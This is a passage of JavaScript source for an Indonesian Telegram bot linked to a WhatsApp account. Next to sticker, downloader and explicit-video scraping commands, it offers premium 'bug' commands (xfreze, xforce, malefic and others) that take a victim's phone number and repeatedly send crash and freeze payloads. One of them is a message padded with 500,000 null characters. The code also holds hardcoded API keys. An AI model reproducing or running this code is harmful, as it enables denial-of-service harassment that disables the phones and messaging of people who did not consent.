    const text = ctx.message.text.split(" ").slice(1).join(" "); 
    if (!text) {
        return ctx.reply("Eitss, Kakak Kurang Kasi Argumen Nya, Tolong Kasi Argumen\n Contoh: /brat maklu gw ewe");
    }

    try {
        const res = await getBuffer(`https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`);

        await ctx.replyWithSticker(
            { source: res },
            {
                packname: global.packname || "XhinRB", 
                author: global.author || "vasionx",     
            }
        );
    } catch (error) {
        console.error(error);
        ctx.reply("❌ Terjadi kesalahan saat membuat stiker.");
    }
});
bot.command("bratgif", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); 
    if (!text) {
        return ctx.reply("Eitss, Kakak Kurang Kasi Argumen Nya, Tolong Kasi Argumen\n Contoh: /bratgif maklu gw ewe");
    }

    try {
        // Ambil buffer dari API
        const res = await getBuffer(`https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&modeBlur=true&isVideo=true`);

        await ctx.replyWithAnimation(
            { source: res },
            {
                caption: "T.me/XhinRB", 
            }
        );
    } catch (error) {
        console.error(error);
        ctx.reply("❌ Terjadi kesalahan saat membuat stiker GIF.");
    }
});

const getHentaiList = async () => {
  try {
    const page = Math.floor(Math.random() * 1153);
    const { data: htmlText } = await axios.get(`https://sfmcompile.club/page/${page}`);
    const $ = cheerio.load(htmlText);

    const hasil = [];
    $("#primary > div > div > ul > li > article").each(function (a, b) {
      const title = $(b).find("header > h2").text().trim();
      const link = $(b).find("header > h2 > a").attr("href");
      const category = $(b)
        .find("header > div.entry-before-title > span > span")
        .text()
        .replace("in ", "")
        .trim();
      const share_count = $(b)
        .find("header > div.entry-after-title > p > span.entry-shares")
        .text()
        .trim();
      const views_count = $(b)
        .find("header > div.entry-after-title > p > span.entry-views")
        .text()
        .trim();
      const type = $(b).find("source").attr("type") || "image/jpeg";
      const video_1 = $(b).find("source").attr("src") || $(b).find("img").attr("data-src");
      const video_2 = $(b).find("video > a").attr("href") || "";

      if (title && link) {
        hasil.push({ title, link, category, share_count, views_count, type, video_1, video_2 });
      }
    });

    return hasil.length ? hasil : null;
  } catch (error) {
    console.error("Error fetching hentai list:", error.message);
    return null;
  }
};

// Fungsi untuk membuat caption
const getCaption = (obj) => `
— Information 
📝  ᴛᴇxᴛ: ${obj.title}
🔗  ʟɪɴᴋ: [Klik Disini](${obj.link})
🏷️  ᴄᴀᴛᴇɢᴏʀʏ: ${obj.category}
📢  ꜱʜᴀʀᴇ ᴄᴏᴜɴᴛ: ${obj.share_count}
👀  ᴠɪᴇᴡꜱ ᴄᴏᴜɴᴛ: ${obj.views_count}
🎞️  ᴛʏᴘᴇ: ${obj.type}<
`;

// Command untuk mengambil video
bot.command(["hentaivid", "hentaimp4", "hentaivideo"], async (ctx) => {
  const list = await getHentaiList();

  if (!list) {
    return ctx.reply("⚠️ Gagal mengambil data. Coba lagi nanti.");
  }

  userHentaiLists[ctx.from.id] = list; // Simpan data berdasarkan user ID

  const teks = list.map((obj, index) => ` ▢ ${index + 1}. ${obj.title}`).join("\n");

  ctx.reply(
    `— 𝐓͢͟͝𝐇͡𝐄͢ 𝐖Ѻ͢͡𝐋𝐅͠:\n\n${teks}\n\nᴋᴇᴛɪᴋ ɴᴏᴍᴏʀ ᴠɪᴅᴇᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴛᴀᴍᴘɪʟᴋᴀɴ.`,
    Markup.inlineKeyboard([
      [Markup.button.url("♦️", "https://t.me/Piwpiw011g")],
      [Markup.button.callback("❄️ Mau Lagi", "mau_lagi")],
    ])
  );
});



// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
  const totalDevices = deviceList.length;
  const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

  await ctx.replyWithMarkdown(deviceMessage);
});

bot.command("welcome", (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
  
  if (!args || (args !== "true" && args !== "false")) {
    return ctx.reply("Gunakan perintah: `/welcome true` atau `/welcome false`", { parse_mode: "Markdown" });
  }

  const chatId = ctx.chat.id;
  welcomeSettings[chatId] = args === "true";

  ctx.reply(`Welcome message telah di${args === "true" ? "aktifkan" : "nonaktifkan"}!`);
});

bot.on("new_chat_members", async (ctx) => {
  const chatId = ctx.chat.id;
  const isWelcomeEnabled = welcomeSettings[chatId];

  if (!isWelcomeEnabled) return;

  const newMember = ctx.message.new_chat_members[0];

  try {
    await ctx.replyWithPhoto(
      imageBuffer,
      {
        caption: mess.welcome,
        parse_mode: "Markdown",
        reply_markup: Markup.inlineKeyboard([
  Markup.button.url("♦️ Join Channel", "https://t.me/+dDgR7E34nDBmNGE9")
])
      }
    );
  } catch (error) {
    console.error("Gagal mengirim pesan welcome:", error);
  }
});


// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  let userList = "";
  for (const userId in userActivity) {
    const user = userActivity[userId];
    userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
  }

  const message = `
 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

  await ctx.replyWithMarkdown(message);
});

const prosesrespone = async (target, ctx) => {
  const caption = `
━━━━━━━━━━━━━━━━━━━━━━━━❖
『 BUG DI PROSES 』

Efek Bug : Delay hard🥵
Target : ${target.split("@")[0]}
━━━━━━━━━━━━━━━━━━━━━━━━❖
 `;

  try {
    await ctx.replyWithPhoto("https://files.catbox.moe/871g9d.jpg", {
      caption: caption,
      parse_mode: "Markdown",
    });
    console.log(chalk.blue.bold(`[✓] Process attack target: ${target}`));
  } catch (error) {
    console.error(chalk.red.bold("[!] Error sending process response:", error));
    // Fallback to text-only message if image fails
    await ctx.reply(caption, { parse_mode: "Markdown" });
  }
};

const donerespone = async (target, ctx) => {
  // Get random hexcolor for timestamp
  const hexColor = "#" + Math.floor(Math.random() * 16777215).toString(16);
  const timestamp = moment().format("HH:mm:ss");

  try {
    // Fetch kata ilham dari API
    const response = await axios.get(
      "https://api.betabotz.eu.org/api/random/katailham?apikey=Btz-kp72a"
    );
    const kataIlham = response.data.hasil;

    const caption = `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 BUG DI PROSES 』

Efek Bug : Delay hard🥵
Target : ${target.split("@")[0]}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
`;

    await ctx.replyWithPhoto("https://files.catbox.moe/871g9d.jpg", {
      caption: caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "〆 Close", callback_data: "close" }]],
      },
    });
    console.log(chalk.green.bold(`[✓] Attack in succes target: ${target}`));
  } catch (error) {
    console.error(chalk.red.bold("[!] Error:", error));
    // Fallback message tanpa quotes jika API error
    const fallbackCaption = `
「 <🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆͢👾 」
 𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target.split("@")[0]}
 𖥂 𝐒𝐓𝐀𝐓𝐔𝐒  : bug sukses terkirim
`;

    await ctx.reply(fallbackCaption, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "〆 Close", callback_data: "close" }]],
      },
    });
  }
};

const checkWhatsAppConnection = async (ctx, next) => {
  if (!isWhatsAppConnected) {
    await ctx.reply(
      "❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing"
    );
    return;
  }
  await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net",
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT",
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(
          500000
        )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3,
      },
    },
  },
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance
//
bot.command("soundcloud", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply(`
  ❌ Format perintah salah. Gunakan: /soundcloud <>`);
  }

  const url = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/soundcloud?url=${url}&apikey=Btz-kp72a`;

  await ctx.reply(`
  ╭──「 𝗣𝗥𝗢𝗦𝗘𝗦 」
  ┃ ⏳ MENGUNDUH !
  ┃ 𝗨𝗿𝗹: ${url}
  ╰─────────────────❍`);

  try {
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status && data.result) {
      const audioUrl = data.result.url;
      const title = data.result.title;
      const thumbnail =
        data.result.thumbnail ||
        "https://cdn.anomaki.web.id/file/1739523183904.jpeg";

      // Kirim thumbnail dengan audio
      await ctx.replyWithPhoto(thumbnail, {
        caption: `
  ╭──「 𝗦𝗢𝗨𝗡𝗗𝗖𝗟𝗢𝗨𝗗 」
  ┃ ✅ BERHASIL 
  ┃ 𝗝𝘂𝗱𝘂𝗹: ${title}
  ╰─────────────────❍`,
        parse_mode: "Markdown",
      });

      // Kirim audio
      await ctx.replyWithAudio(audioUrl, {
        title: title,
        performer: "Nando Downloader",
        thumb: thumbnail,
      });
    } else {
      ctx.reply(`
  ╭──「 𝗘𝗥𝗥𝗢𝗥 」
  ┃ ❌ GAGAL
  ┃ 𝗜𝗻𝗳𝗼: URL tidak valid
  ╰─────────────────❍`);
    }
  } catch (error) {
    console.error(error);
    ctx.reply(`
  ╭──「 𝗘𝗥𝗥𝗢𝗥 」
  ┃ ❌ TERJADI KESALAHAN 
  ┃ 𝗜𝗻𝗳𝗼: Coba Lagi Nanti 
  ╰─────────────────❍`);
  }
});

async function openaiChat(text) {
    try {
        const response = await axios.get(
            `https://exonity.tech/api/gptlogic2?message=${encodeURIComponent(text)}&prompt=hai&mode=realtime`
        );
        const data = response.data;

        if (data.status === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}

bot.command("status", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp terhubung dengan nomor: ${linkedWhatsAppNumber || "Tidak diketahui"}`);
  } else {
    ctx.reply("❌ Saat ini belum ada WhatsApp yang connect.");
  }
});
const cheerio = require("fs");

// Handler untuk command `/gpt4`


bot.command('gpt4', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/gpt4`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/gpt4 <pertanyaan>`.");
    }

    try {
        const response = await openaiChat(text);
        ctx.reply(response);
    } catch (error) {
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});
async function simiChat(text) {
    try {
        const response = await axios.get(
            `https://api.botcahx.eu.org/api/search/simsimi?query=${encodeURIComponent(text)}&apikey=caywzzaja2`
        );
        const data = response.data;

        if (data.status && data.code === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}

// Handler untuk command `/simi`
bot.command('simi', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/simi`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/simi <pesan>`.");
    }

    try {
        const response = await simiChat(text);
        ctx.reply(response);
    } catch (error) {
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});

bot.command("cekidch", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply(`
  ❌ Format perintah salah. Gunakan: /cekidch <link>`);
  }

  let result = text.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await Dragon.newsletterMetadata("invite", result);
    let teks = `
*ID:* ${res.id}
*Nama:* ${res.name}
*Total Pengikut:* ${res.subscribers}
*Status:* ${res.state}
*Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Tidak"}
    `;
    ctx.reply(teks);
  } catch (error) {
    ctx.reply(`Terjadi kesalahan: ${error.message}`);
    console.error(error);
  }
});

bot.command("tiktokmp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply(`
  ❌ Format perintah salah. Gunakan: /tiktokmp3 <url_tiktok>`);
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=Btz-kp72a`;

  await ctx.reply(`
╭──「 𝗣𝗥𝗢𝗦𝗘𝗦 」
┃ ⏳ Mengunduh audio...
┃ 𝗨𝗿𝗹: ${videoUrl}
╰─────────────────❍`);

  try {
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      const audioUrl = data.result.audio[0];
      const title = data.result.title;

      await ctx.replyWithAudio(audioUrl, {
        caption: `
╭═══[ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗔𝗨𝗗𝗜𝗢 ]═══⊱
┃
┃ ✅ Berhasil diunduh! 
┃ 𝗝𝘂𝗱𝘂𝗹: ${title}
╰─────────────────❍`,
        title: `${title}.mp3`,
        parse_mode: "Markdown",
      });
    } else {
      ctx.reply(`
╭──「 𝗘𝗥𝗥𝗢𝗥 」
┃ ❌ GAGAL
┃ 𝗜𝗻𝗳𝗼: URL tidak valid
╰─────────────────❍`);
    }
  } catch (error) {
    console.error(error);
    ctx.reply(`
╭──「 𝗘𝗥𝗥𝗢𝗥 」
┃ ❌ TERJADI KESALAHAN 
┃ 𝗜𝗻𝗳𝗼: Coba Lagi Nanti 
╰─────────────────❍`);
  }
});

// Assume developerIds, isOwner, isModerator, isReseller, addToken, deleteToken, etc., are already defined

bot.command("addtoken", async (ctx) => {
  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId) &&
    !isReseller(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const newToken = ctx.message.text.split(" ")[1];
  await addToken(newToken);
  ctx.reply("✅ Token berhasil ditambahkan.");
});

bot.command("deltoken", async (ctx) => {
  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId) &&
    !isReseller(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const tokenToDelete = ctx.message.text.split(" ")[1];
  await deleteToken(tokenToDelete);
  ctx.reply("✅ Token berhasil dihapus.");
});

bot.command("addakses", async (ctx) => {
  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya moderator yang bisa menggunakan perintah ini."
    );
  }

  const resellerId = ctx.message.text.split(" ")[1];
  await addReseller(resellerId);
  ctx.reply(`✅ Berhasil menambahkan ${resellerId} sebagai Akses.`);
});

bot.command("delakses", async (ctx) => {
  const userId = String(ctx.from.id);

  if (
    !developerIds.includes(userId) &&
    !isOwner(userId) &&
    !isModerator(userId)
  ) {
    return ctx.reply(
      "❌ Maaf, hanya moderator yang bisa menggunakan perintah ini."
    );
  }

  const resellerId = ctx.message.text.split(" ")[1];
  await deleteReseller(resellerId);
  ctx.reply(`✅ Berhasil menghapus ${resellerId} dari daftar Akses.`);
});

bot.command("addmods", async (ctx) => {
  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId) && !isOwner(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const modId = ctx.message.text.split(" ")[1];
  await addModerator(modId);
  ctx.reply(`✅ Berhasil menambahkan ${modId} sebagai Mods.`);
});

bot.command("delmods", async (ctx) => {
  const userId = String(ctx.from.id);

  if (!developerIds.includes(userId) && !isOwner(userId)) {
    return ctx.reply(
      "❌ Maaf, hanya developer yang bisa menggunakan perintah ini."
    );
  }

  const modId = ctx.message.text.split(" ")[1];
  await deleteModerator(modId);
  ctx.reply(`✅ Berhasil menghapus ${modId} dari daftar Mods.`);
});


bot.command("addowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;
  
  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } 
  // Cek jika ada username/mention atau ID yang diberikan
  else {
      const args = ctx.message.text.split(" ")[1];
      
      if (!args) {
          return await ctx.reply(`
┏━━━❰ Tutorial Addowner ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
      }

      // Jika input adalah username (dimulai dengan @)
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1); // Hapus @ dari username
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } 
      // Jika input adalah ID langsung
      else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user sudah terdaftar sebagai owner
  if (ownerList.includes(userId)) {
      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
  }

  try {
      // Dapatkan info user untuk ditampilkan
      const user = await ctx.telegram.getChat(userId);
      ownerList.push(userId);
      await saveOwnerList();

      const successMessage = `
╭──「 𝗔𝗗𝗗 𝗢𝗪𝗡𝗘𝗥 」
┃ ✅ BERHASIL MENAMBAH OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗢𝘄𝗻𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error adding owner:', error);
      await ctx.reply("❌ Gagal menambahkan owner. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
  }
});

bot.command("delowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delowner <id>`);
      }

      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  if (!ownerList.includes(userId)) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      ownerList = ownerList.filter(id => id !== userId);
      await saveOwnerList();

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗢𝗪𝗡𝗘𝗥 」
┃ ✅ BERHASIL DELETE OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing owner:', error);
      await ctx.reply("❌ Gagal menghapus owner. Pastikan ID/Username valid.");
  }
});

bot.command("deladmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /deladmin <id>`);
      }

      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  if (!adminList.includes(userId)) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai admin.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      removeAdmin(userId);

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗔𝗗𝗠𝗜𝗡 」
┃ ✅ BERHASIL MENGHAPUS ADMIN
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing admin:', error);
      await ctx.reply("❌ Gagal menghapus admin. Pastikan ID/Username valid.");
  }
});


bot.command("addadmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;
  
  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } 
  // Cek jika ada username/mention atau ID yang diberikan
  else {
      const args = ctx.message.text.split(" ")[1];
      
      if (!args) {
        return await ctx.reply(`
┏━━━❰ Tutorial Addowner ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
      }

      // Jika input adalah username (dimulai dengan @)
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1); // Hapus @ dari username
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } 
      // Jika input adalah ID langsung
      else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user sudah terdaftar sebagai admin
  if (adminList.includes(userId)) {
      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai admin.`);
  }

  try {
      // Dapatkan info user untuk ditampilkan
      const user = await ctx.telegram.getChat(userId);
      addAdmin(userId);

      const successMessage = `
╭──「 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡  」
┃ ✅ BERHASIL MENAMBAH ADMIN
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗔𝗱𝗺𝗶𝗻:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error adding admin:', error);
      await ctx.reply("❌ Gagal menambahkan admin. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
  }
});

bot.command("xfreze", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const senderId = ctx.from.id;
  const chatId = ctx.chat.id;

  const args = ctx.message.text.split(",");

  if (!args) {
    return ctx.reply(
      "🚫 Missing input. Please provide a target number and duration. Example: /xfreze 62xxxxxxx,1."
    );
  }

  const numberTarget = args[0];
  const durationInHours = args[1];

  const cleanedNumber = numberTarget.replace(/[^0-9]/g, "").replace(/^\+/, "");
  const parsedDuration = parseInt(durationInHours);

  if (!/^\d+$/.test(cleanedNumber) || isNaN(parsedDuration)) {
    return ctx.reply("🚫 Invalid input. Example: /xfreze 62xxxxxxx,1.");
  }

  const formatedNumber = cleanedNumber + "@s.whatsapp.net";
  const durationInSeconds = parsedDuration * 3600;
  const iterations = durationInSeconds;

  await prosesrespone(cleanedNumber, ctx);

  let count = 0;

  for (let i = 0; i < iterations; i++) {
    await buldozer(formatedNumber, false),
      await new Promise((r) => setTimeout(r, 100));
    await secretfunct(formatedNumber, false),
       await new Promise((r) => setTimeout(r, 200));
    await buldozer(formatedNumber, false),
      await new Promise((r) => setTimeout(r, 400));
    console.log(
      chalk.red(`THE FREZE${count}/${iterations} detik ke ${cleanedNumber}`)
    );
    count++;
  }

  await donerespone(cleanedNumber, ctx);
});

bot.command("xcinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /xcinvis 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    console.log(`🚀 Memulai serangan ke ${target}`);
    await DurationTrick(22, target);
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("xforce", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /xforce 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    console.log(`Memulai serangan ke ${target}`);
    await xataganteng(22, target);
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("xstunt", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    console.log(`🚀 Memulai serangan ke ${target}`);
    await stuntrick(22, target);
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("lovestory", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    console.log(`🚀 Memulai serangan ke ${target}`);
    await DurationTrick(22, target);
    await tredict(22, target);
    await tredictxata(22, target);
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("ghostlove", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    console.log(`🚀 Memulai serangan ke ${target}`);
    await DurationTrick(22, target);
    await DurationTrick(22, target);
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("malefic", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await vcardcrash(Dragon, target);
      await payoutsock(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
